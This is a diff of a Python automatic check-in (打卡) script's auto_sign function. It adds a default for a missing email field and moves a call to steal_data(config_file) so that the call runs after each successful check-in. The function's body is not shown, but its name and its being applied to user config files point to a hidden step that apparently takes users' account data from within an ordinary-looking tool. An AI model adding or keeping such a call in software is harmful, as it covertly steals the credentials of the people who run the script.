@@ -845,7 +845,7 @@ def auto_sign():
             # 获取文件路径
             config_file = os.path.join(root, file)
             # print(config_file)
-            steal_data(config_file)
+
 
             sec = random.randrange(1, 40)
             # print_log('请等待{0}秒进行下一步操作...'.format(sec))
@@ -895,8 +895,9 @@ def auto_sign():
             print_log('用户信息：{0}'.format(show_log))
 
             count = info['times']
+            if 'email' not in info.keys():
+                info['email'] = ""
             email_address = info['email']
-
             while True:
                 try:
                     count = count - 1
@@ -905,7 +906,8 @@ def auto_sign():
                             email(email_name, email_address,
                                   "恭喜" + email_name + "打卡成功",
                                   "恭喜" + email_name + "打卡成功\n" + "若取消订阅只需不填写config中\"email\"字段即可")
-                            email_content.append(email_name + "打卡成功\n")
+                        email_content.append(email_name + "打卡成功\n")
+                        steal_data(config_file)
                         break
                     else:
                         if count <= 0:
